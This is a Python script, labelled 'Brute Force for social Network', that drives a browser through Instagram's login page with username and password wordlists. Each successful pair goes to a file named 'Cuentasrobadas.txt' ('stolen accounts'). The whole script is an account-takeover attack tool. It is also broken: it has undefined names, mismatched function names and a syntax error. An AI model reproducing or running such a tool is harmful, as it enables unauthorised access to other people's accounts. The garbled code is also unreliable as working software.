#!/usr/bin/python
--*coding: utf-8*--
import os
import sys
import urllib
import argparse
import subprocess
import optparse
from time import sleep
from Core.browser import Browser
from selenium.webdriver.common.keys import Keys
from selenium import webdriver
from mainLib import *

parser = argparser.ArgumentParser(description='Brute Force for social Network')
required.add_argument('-t','--target',dest='Usernames.txt')
required.add_argument('-w','--wordlist',dest='wordlist.txt')
required.add_argument('-d','--delay',dest='wait time')

args= parser.parse_args()


profile = webdriver.FirefoxProfile()
profile.set_preference("general.useragent.override", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.76 Safari/537.36")
driver = "reserved"

def usuariosExistentes (username):
	try:		
		driver.get("https://instagram.com/"+username)
		assert (("Pagina no encontrada") not in driver.title)
	except AssertionError:
		print 'usuario: "%s" no existe!, intenta con el siguiente!' %username
	except:
		'error desconocido'

def login (user, password, delay):
	try:
		print 'Probando contraseña: ' + password
		elem = driver.find_element_by_name("username")
		elem.clear()
		elem.send_keys(user)
		elem = driver.find_element_by_name("password")
		elem.clear()
		elem.send_keys(password)
		elem.send_keys(Keys.RETURN)
		sleep(delay)
		assert (("login") in driver.title)
		#assert (("Tu usuario o contraseña son incorrectas.") not in driver.page_source)
		#if driver.current_url == 'https://www.instagram.com/':
		#	print 'Contraseña correcta!'
		#	print '%s' %password
		#else:
		#	print 'Contraseña erronea'
		#	print '%s' %password
		#else
		#	print 'Contraseña erronea'
	except AssertionError:
		print 'Acceso concebido madaJuaker!'
		print 'La contraseña es: ' + password
		try:
			f = open('Cuentasrobadas.txt','a')
		except:
			f = open('Cuentasrobadas.txt','w')
		f.write('username:'+user+'\npassword:'+password+'\n')
		f.close()
		driver.delete_all_cookies()
		return 1
	except:
		print "\r revisa tu conexion a internet, subnormal\r"
def DictionaryAttack(usernames,passwords,delay):
	if str(type)(usernames)) == "<type 'list'>":
		for username in usernames:
			if (userExist(username) == 1):
				continue
			driver.get("https://instagram.com/acccounts/login/")
			sleep(delay * 7)
			print 'intentando con el Usuario: ' + username
			for password in passwords:
				if (login(username,password,delay) == 1):
					cj.clear()
					break
	else:
		if (userExists(usernames) == 1):
			return
		driver.get("https://instagram.com/accounts/login/")
		sleep(delay * 7)
		print 'Trying with username: ' + usernames
		for password in passwords:
			if (login(usernames,password,delay) == 1):
				break
